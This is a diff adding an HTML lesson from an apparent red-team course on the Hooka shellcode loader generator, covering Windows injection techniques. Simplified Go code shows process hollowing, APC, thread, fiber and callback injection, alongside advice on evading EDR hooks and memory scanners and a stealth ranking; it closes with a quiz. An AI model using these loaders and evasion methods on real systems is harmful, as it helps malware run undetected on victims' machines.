@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 2: Injection Techniques - Hooka Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1FA9D;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#4ade80;--accent2:#2dd4bf;--gradient:linear-gradient(135deg,#4ade80,#2dd4bf)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Hooka Course</h2>
+<span>Shellcode Loader Generator</span>
+</div>
+<a class="home-link" href="../Hooka_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Intro to Shellcode Loaders</span><span class="diff d1">d1</span></a>
+<a class="mod-link active" href="module2.html"><span>2. Injection Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Syscalls &amp; Gate Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Unhooking &amp; Patching</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Sandbox &amp; Process Protection</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Encryption &amp; Obfuscation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. The Hooka Go Library</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. CLI Generator &amp; Full Chain</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 2: Injection Techniques</h1>
+<p class="subtitle">Getting code into memory is easy. Getting it there without anyone noticing is the art.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>This module covers every injection technique available in Hooka &mdash; both the 6 CLI-accessible methods and the 14 library methods. You will learn the difference between self-injection, remote injection, and process-creation-based techniques, understand the API call chains behind each method, and see how Hooka implements them in Go.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Injection Fundamentals</h2>
+
+<p>Shellcode injection is the process of placing arbitrary machine code into executable memory and transferring control to it. Every injection technique ultimately needs to solve three problems:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">The Three Injection Problems</h4>
+<div class="flow">
+<div class="flow box">1. Allocate Memory<br><small>Get a writable region in the target</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">2. Write Shellcode<br><small>Copy payload bytes into that region</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">3. Execute<br><small>Transfer control to the shellcode</small></div>
+</div>
+</div>
+
+<p>The differences between techniques lie in <strong>where</strong> the memory is allocated (self vs remote process), <strong>how</strong> the shellcode is written (direct write vs process memory APIs), and <strong>what mechanism</strong> triggers execution (new thread, APC, callback, or hijacked thread).</p>
+
+<h3>Injection Categories</h3>
+
+<table>
+<tr><th>Category</th><th>Description</th><th>Examples in Hooka</th></tr>
+<tr><td><strong>Self-Injection</strong></td><td>Shellcode runs in the loader's own process. Simpler, but the loader process itself is suspicious.</td><td>NtCreateThreadEx (local), UuidFromString, Fibers, EnumSystemLocales, Callbacks</td></tr>
+<tr><td><strong>Remote Injection</strong></td><td>Shellcode is written into another (legitimate) process. More evasive but requires cross-process API calls.</td><td>CreateRemoteThread, RtlCreateUserThread, NtQueueApcThreadEx</td></tr>
+<tr><td><strong>Process Creation</strong></td><td>A new process is created in a suspended state, modified, then resumed. The shellcode lives in a seemingly clean process.</td><td>SuspendedProcess, ProcessHollowing</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>2. SuspendedProcess (Default CLI Method)</h2>
+
+<p>This is Hooka's <strong>default injection technique</strong> when used from the CLI. It creates a new process in a suspended state, writes shellcode into it, and resumes the main thread.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">SuspendedProcess Flow</h4>
+<div class="flow">
+<div class="flow box">CreateProcessA<br><small>CREATE_SUSPENDED flag</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">VirtualAllocEx<br><small>Allocate in target</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">WriteProcessMemory<br><small>Copy shellcode</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">VirtualProtectEx<br><small>RW &rarr; RX</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">ResumeThread<br><small>Execute</small></div>
+</div>
+</div>
+
+<pre><span class="lang-tag">Go</span>// Hooka's SuspendedProcess injection (simplified)
+func SuspendedProcess(shellcode []byte, process string) error {
+    // Create target process in suspended state
+    si := &syscall.StartupInfo{}
+    pi := &syscall.ProcessInformation{}
+    err := syscall.CreateProcess(
+        nil, syscall.StringToUTF16Ptr(process),
+        nil, nil, false,
+        CREATE_SUSPENDED,  // 0x00000004
+        nil, nil, si, pi,
+    )
+
+    // Allocate memory in the remote process
+    addr, _ := VirtualAllocEx(pi.Process, 0, len(shellcode),
+        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+    // Write shellcode
+    WriteProcessMemory(pi.Process, addr, shellcode)
+
+    // Change permissions: RW -> RX (avoid RWX)
+    VirtualProtectEx(pi.Process, addr, len(shellcode),
+        PAGE_EXECUTE_READ, &oldProtect)
+
+    // Resume the suspended thread
+    ResumeThread(pi.Thread)
+    return nil
+}</pre>
+
+<div class="card">
+<h4>Why CREATE_SUSPENDED?</h4>
+<p>Creating the process suspended gives the loader a window to modify the process before any of its code runs. The target process (e.g., <code>svchost.exe</code> or <code>notepad.exe</code>) appears in the process list but has not executed any of its own code yet. After the shellcode is written and permissions are set, resuming the thread starts execution from the shellcode rather than the original entry point.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Process Hollowing</h2>
+
+<p>Process Hollowing is a more sophisticated variant where the loader <strong>replaces the legitimate code</strong> of the target process with shellcode. Unlike SuspendedProcess (which allocates new memory), hollowing overwrites the original executable's memory region.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Process Hollowing Walkthrough</h4>
+<div class="flow">
+<div class="flow box">CreateProcessA<br><small>CREATE_SUSPENDED</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">ZwQueryInformationProcess<br><small>Find PEB address</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">ReadProcessMemory<br><small>Read PEB &rarr; ImageBase</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">WriteProcessMemory<br><small>Overwrite entry point</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">ResumeThread<br><small>Execute hollowed code</small></div>
+</div>
+</div>
+
+<pre><span class="lang-tag">Go</span>// Process Hollowing - key steps (simplified)
+func ProcessHollowing(shellcode []byte, process string) error {
+    // Step 1: Create suspended process
+    createSuspendedProcess(process, &pi)
+
+    // Step 2: Query PEB location
+    var pbi PROCESS_BASIC_INFORMATION
+    ZwQueryInformationProcess(pi.Process,
+        ProcessBasicInformation, &pbi, ...)
+
+    // Step 3: Read image base from PEB
+    // PEB + 0x10 = ImageBaseAddress on x64
+    var imageBase uintptr
+    ReadProcessMemory(pi.Process,
+        pbi.PebBaseAddress + 0x10, &imageBase, ...)
+
+    // Step 4: Read PE header to find entry point
+    var peHeader [0x200]byte
+    ReadProcessMemory(pi.Process, imageBase, &peHeader, ...)
+    entryPointRVA := parsePEEntryPoint(peHeader)
+
+    // Step 5: Write shellcode at entry point
+    WriteProcessMemory(pi.Process,
+        imageBase + entryPointRVA, shellcode, ...)
+
+    // Step 6: Resume execution
+    ResumeThread(pi.Thread)
+    return nil
+}</pre>
+
+<div class="card warn">
+<h4>Detection Considerations</h4>
+<p>Process Hollowing is a well-known technique. EDRs look for the telltale pattern of <code>CreateProcess</code> (suspended) followed by <code>ZwQueryInformationProcess</code> and <code>WriteProcessMemory</code>. Hooka mitigates this by optionally combining hollowing with direct syscalls (Module 3) and NTDLL unhooking (Module 4) to avoid triggering the EDR's userland hooks on these functions.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. NtCreateThreadEx</h2>
+
+<p><code>NtCreateThreadEx</code> is a native NT API function that creates a thread in any process. Unlike the higher-level <code>CreateRemoteThread</code>, it operates at a lower level and can be called via direct syscalls to bypass EDR hooks entirely.</p>
+
+<pre><span class="lang-tag">Go</span>// NtCreateThreadEx injection
+func NtCreateThreadEx(shellcode []byte) error {
+    // Allocate local memory
+    addr, _ := VirtualAlloc(0, len(shellcode),
+        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+    // Copy shellcode
+    RtlCopyMemory(addr, shellcode, len(shellcode))
+
+    // Change to executable
+    VirtualProtect(addr, len(shellcode),
+        PAGE_EXECUTE_READ, &oldProtect)
+
+    // Create thread at shellcode address
+    var hThread uintptr
+    NtCreateThreadEx(&hThread,
+        THREAD_ALL_ACCESS,   // DesiredAccess
+        nil,                  // ObjectAttributes
+        currentProcess,       // ProcessHandle (self)
+        addr,                 // StartRoutine (shellcode)
+        0,                    // Argument
+        0,                    // CreateFlags
+        0, 0, 0,             // StackSize params
+        nil)                  // AttributeList
+
+    WaitForSingleObject(hThread, INFINITE)
+    return nil
+}</pre>
+
+<p>For <strong>remote injection</strong>, the same function is used but with a handle to the target process instead of <code>currentProcess</code>. Hooka also provides <code>NtCreateThreadExHalos</code>, which combines this injection method with Halo's Gate syscall resolution (covered in Module 3).</p>
+
+<!-- ============================================================ -->
+<h2>5. EtwpCreateEtwThread</h2>
+
+<p>This technique abuses an undocumented Windows function: <code>EtwpCreateEtwThread</code>. This function is normally used internally by the Event Tracing for Windows subsystem to create worker threads. By calling it with a shellcode address as the start routine, the loader gets code execution through a mechanism that most EDRs do not monitor.</p>
+
+<pre><span class="lang-tag">Go</span>// EtwpCreateEtwThread injection
+func EtwpCreateEtwThread(shellcode []byte) error {
+    addr, _ := VirtualAlloc(0, len(shellcode),
+        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+    RtlCopyMemory(addr, shellcode, len(shellcode))
+    VirtualProtect(addr, len(shellcode),
+        PAGE_EXECUTE_READ, &oldProtect)
+
+    // Resolve the undocumented function from ntdll
+    etwpFunc := GetProcAddress(
+        GetModuleHandle("ntdll.dll"),
+        "EtwpCreateEtwThread")
+
+    // Call it with shellcode as the thread start
+    syscall.SyscallN(etwpFunc, addr, 0)
+    return nil
+}</pre>
+
+<div class="card green">
+<h4>Why EtwpCreateEtwThread?</h4>
+<p>Most EDR products hook <code>NtCreateThreadEx</code>, <code>CreateRemoteThread</code>, and <code>RtlCreateUserThread</code>. Very few monitor <code>EtwpCreateEtwThread</code> because it is not a documented API and is not commonly used for thread creation. This makes it a lower-detection alternative for self-injection scenarios.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. APC-Based Injection</h2>
+
+<p>Asynchronous Procedure Calls (APCs) are a Windows mechanism for queuing work to a specific thread. When a thread enters an alertable wait state (e.g., <code>SleepEx</code>, <code>WaitForSingleObjectEx</code>), any queued APCs execute. Hooka implements two APC variants:</p>
+
+<h3>NtQueueApcThreadEx</h3>
+<p>The native NT variant that queues an APC to a thread in a remote process. The APC points to the shellcode address, so when the target thread becomes alertable, the shellcode runs.</p>
+
+<pre><span class="lang-tag">Go</span>// NtQueueApcThreadEx injection
+func NtQueueApcThreadEx(shellcode []byte, process string) error {
+    // Create suspended process to get a guaranteed alertable thread
+    createSuspendedProcess(process, &pi)
+
+    // Allocate and write shellcode in target
+    addr := allocateAndWrite(pi.Process, shellcode)
+
+    // Queue APC to the main thread
+    NtQueueApcThreadEx(pi.Thread,
+        1,     // ApcRoutine type (UserApcReserveHandle for special APC)
+        addr,  // APC routine = shellcode
+        0,     // Arg1
+        0)     // Arg2
+
+    // Resume thread - APC fires when thread becomes alertable
+    ResumeThread(pi.Thread)
+    return nil
+}</pre>
+
+<h3>QueueUserApc</h3>
+<p>The higher-level Win32 variant. Functionally similar but uses the documented <code>QueueUserAPC</code> API. Less stealthy than the Nt variant but more reliable across Windows versions.</p>
+
+<!-- ============================================================ -->
+<h2>7. No-RWX Technique</h2>
+
+<p>A <strong>No-RWX</strong> loader never creates memory that is both writable and executable at the same time. This is critical because memory scanners flag <code>PAGE_EXECUTE_READWRITE</code> (0x40) allocations as highly suspicious.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">No-RWX Permission Lifecycle</h4>
+<div class="flow">
+<div class="flow box">VirtualAlloc<br><small>PAGE_READWRITE (RW)</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">memcpy<br><small>Write shellcode</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">VirtualProtect<br><small>PAGE_EXECUTE_READ (RX)</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Execute<br><small>Shellcode runs as RX</small></div>
+</div>
+</div>
+
+<p>Hooka applies this pattern across all its injection methods. Memory starts as <code>PAGE_READWRITE</code> for the write phase, then transitions to <code>PAGE_EXECUTE_READ</code> before execution. At no point does the memory have all three permissions simultaneously.</p>
+
+<div class="card warn">
+<h4>RWX vs No-RWX Detection</h4>
+<p>Tools like <strong>Moneta</strong> specifically scan for private memory pages with <code>PAGE_EXECUTE_READWRITE</code> protection. By using the RW &rarr; RX transition, Hooka avoids this trivial detection. However, note that the <code>VirtualProtect</code> call itself can be monitored &mdash; an EDR that hooks <code>NtProtectVirtualMemory</code> will see the permission change. This is why combining No-RWX with direct syscalls (Module 3) provides stronger evasion.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Callback-Based Execution</h2>
+
+<p>Instead of creating threads, callback-based techniques abuse Windows API functions that accept function pointers. The loader passes the shellcode address as the callback, and Windows calls it as part of the API's normal operation.</p>
+
+<h3>UuidFromString</h3>
+<p>Shellcode is encoded as UUID strings. <code>UuidFromStringA</code> decodes each UUID back into bytes, writing them into an executable heap. A callback function pointer then triggers execution.</p>
+
+<h3>Fibers</h3>
+<p>Windows Fibers are lightweight threads managed in user mode. The loader converts the current thread to a fiber, creates a new fiber pointing to the shellcode, and switches to it:</p>
+
+<pre><span class="lang-tag">Go</span>// Fiber-based execution
+func FiberInject(shellcode []byte) error {
+    addr := allocateAndWriteRX(shellcode)
+
+    // Convert current thread to fiber
+    mainFiber := ConvertThreadToFiber(0)
+
+    // Create new fiber with shellcode as start
+    scFiber := CreateFiber(0, addr, 0)
+
+    // Switch to shellcode fiber
+    SwitchToFiber(scFiber)
+
+    // Shellcode has executed, switch back
+    SwitchToFiber(mainFiber)
+    return nil
+}</pre>
+
+<h3>EnumSystemLocales</h3>
+<p><code>EnumSystemLocalesEx</code> accepts a callback function that it invokes for each locale on the system. If the callback pointer is the shellcode address, the shellcode executes when Windows enumerates the first locale:</p>
+
+<pre><span class="lang-tag">Go</span>// EnumSystemLocales callback execution
+func EnumSystemLocalesInject(shellcode []byte) error {
+    addr := allocateAndWriteRX(shellcode)
+
+    // Windows calls addr() for each system locale
+    EnumSystemLocalesEx(addr, LOCALE_ALL, 0, 0)
+    return nil
+}</pre>
+
+<div class="card">
+<h4>Why Callbacks Evade Detection</h4>
+<p>Callback-based execution avoids the <code>CreateThread</code> / <code>NtCreateThreadEx</code> API calls that EDRs heavily monitor. The execution happens inside a legitimate Windows API function, making the call stack appear normal. The thread was not created to run shellcode &mdash; it was created to enumerate locales or convert fibers, and the shellcode execution is a side effect.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>9. Remote Injection Variants</h2>
+
+<h3>CreateRemoteThread</h3>
+<p>The classic remote injection API. Opens a handle to the target process, allocates memory, writes shellcode, and creates a thread. Well-known and heavily monitored, but included in Hooka's library for completeness.</p>
+
+<h3>RtlCreateUserThread</h3>
+<p>An undocumented ntdll function that creates threads in remote processes. Less monitored than <code>CreateRemoteThread</code> because it bypasses kernel32.</p>
+
+<!-- ============================================================ -->
+<h2>10. Halo's Gate Injection Variants</h2>
+
+<p>Hooka provides Halo's Gate-enhanced versions of certain injection methods. These combine the injection technique with Halo's Gate syscall resolution (detailed in Module 3) to bypass EDR hooks on the APIs used during injection:</p>
+
+<ul>
+<li><strong>NtCreateThreadExHalos</strong> &mdash; NtCreateThreadEx with Halo's Gate SSN resolution</li>
+<li><strong>EnumSystemLocalesHalos</strong> &mdash; EnumSystemLocales callback with Halo's Gate</li>
+</ul>
+
+<p>By resolving system service numbers dynamically and making direct syscalls, these variants bypass any inline hooks that EDRs have placed on the relevant ntdll functions.</p>
+
+<!-- ============================================================ -->
+<h2>11. Complete Technique Comparison</h2>
+
+<p>This table summarizes all 14 injection techniques available in Hooka's library:</p>
+
+<table>
+<tr><th>Technique</th><th>Type</th><th>Key API</th><th>CLI</th><th>Stealth</th></tr>
+<tr><td>SuspendedProcess</td><td>Process Creation</td><td>CreateProcessA + ResumeThread</td><td>Yes</td><td>Medium</td></tr>
+<tr><td>ProcessHollowing</td><td>Process Creation</td><td>ZwQueryInformationProcess + WriteProcessMemory</td><td>Yes</td><td>Medium</td></tr>
+<tr><td>NtCreateThreadEx</td><td>Self / Remote</td><td>NtCreateThreadEx</td><td>Yes</td><td>Medium</td></tr>
+<tr><td>EtwpCreateEtwThread</td><td>Self</td><td>EtwpCreateEtwThread (undocumented)</td><td>Yes</td><td>High</td></tr>
+<tr><td>NtQueueApcThreadEx</td><td>Remote (APC)</td><td>NtQueueApcThreadEx</td><td>Yes</td><td>High</td></tr>
+<tr><td>QueueUserApc</td><td>Remote (APC)</td><td>QueueUserAPC</td><td>Yes</td><td>Medium</td></tr>
+<tr><td>CreateRemoteThread</td><td>Remote</td><td>CreateRemoteThread</td><td>No</td><td>Low</td></tr>
+<tr><td>RtlCreateUserThread</td><td>Remote</td><td>RtlCreateUserThread (undocumented)</td><td>No</td><td>Medium</td></tr>
+<tr><td>UuidFromString</td><td>Self (Callback)</td><td>UuidFromStringA</td><td>No</td><td>High</td></tr>
+<tr><td>Fibers</td><td>Self (Callback)</td><td>CreateFiber + SwitchToFiber</td><td>No</td><td>High</td></tr>
+<tr><td>EnumSystemLocales</td><td>Self (Callback)</td><td>EnumSystemLocalesEx</td><td>No</td><td>High</td></tr>
+<tr><td>Callbacks (generic)</td><td>Self (Callback)</td><td>Various Windows callbacks</td><td>No</td><td>High</td></tr>
+<tr><td>NtCreateThreadExHalos</td><td>Self / Remote</td><td>NtCreateThreadEx + Halo's Gate</td><td>No</td><td>Very High</td></tr>
+<tr><td>EnumSystemLocalesHalos</td><td>Self (Callback)</td><td>EnumSystemLocales + Halo's Gate</td><td>No</td><td>Very High</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>12. Choosing an Injection Technique</h2>
+
+<div class="card green">
+<h4>Decision Framework</h4>
+<p>When selecting an injection technique, consider these factors:</p>
+<ul>
+<li><strong>Self-injection</strong> is simpler and faster, but the loader process is the one that appears malicious. Best for quick testing or scenarios where the process identity doesn't matter.</li>
+<li><strong>Remote injection</strong> hides shellcode in a legitimate process (e.g., <code>explorer.exe</code>), but cross-process operations are heavily monitored by EDRs.</li>
+<li><strong>Process creation</strong> (SuspendedProcess, Hollowing) creates a fresh, clean-looking process. Good balance of stealth and reliability.</li>
+<li><strong>Callback-based</strong> methods avoid thread creation APIs entirely, making them the stealthiest for self-injection scenarios.</li>
+<li><strong>Halo's Gate variants</strong> add syscall-level evasion on top of the base technique, providing maximum hook bypass.</li>
+</ul>
+</div>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Injection Decision Tree</h4>
+<div class="flow">
+<div class="flow box">Need remote process?</div>
+<div class="flow arrow">&rarr; Yes</div>
+<div class="flow box">Stealth priority?<br><small>High: APC / Low: RemoteThread</small></div>
+<div class="flow arrow">&rarr; No</div>
+<div class="flow box">Thread creation OK?<br><small>Yes: EtwpCreate / No: Callbacks</small></div>
+</div>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: What is the key difference between SuspendedProcess injection and Process Hollowing?</p>
+<div class="quiz-btn" data-choice="A">A) SuspendedProcess uses DLL injection while Hollowing uses shellcode</div>
+<div class="quiz-btn" data-choice="B">B) SuspendedProcess allocates new memory while Hollowing overwrites the original entry point</div>
+<div class="quiz-btn" data-choice="C">C) SuspendedProcess is remote while Hollowing is self-injection</div>
+<div class="quiz-btn" data-choice="D">D) SuspendedProcess requires admin privileges while Hollowing does not</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: Why are callback-based injection techniques (Fibers, EnumSystemLocales) considered stealthier than thread creation?</p>
+<div class="quiz-btn" data-choice="A">A) They use encrypted memory</div>
+<div class="quiz-btn" data-choice="B">B) They don't require VirtualAlloc</div>
+<div class="quiz-btn" data-choice="C">C) They avoid CreateThread/NtCreateThreadEx APIs that EDRs heavily monitor</div>
+<div class="quiz-btn" data-choice="D">D) They run shellcode in kernel mode</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: What does the No-RWX technique prevent?</p>
+<div class="quiz-btn" data-choice="A">A) Memory pages from ever having simultaneous write and execute permissions</div>
+<div class="quiz-btn" data-choice="B">B) Shellcode from being encrypted</div>
+<div class="quiz-btn" data-choice="C">C) Remote processes from being injected</div>
+<div class="quiz-btn" data-choice="D">D) AMSI from scanning the shellcode</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module1.html">&larr; Previous: Introduction</a>
+<a class="primary" href="module3.html">Next: Syscalls &amp; Gate Techniques &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
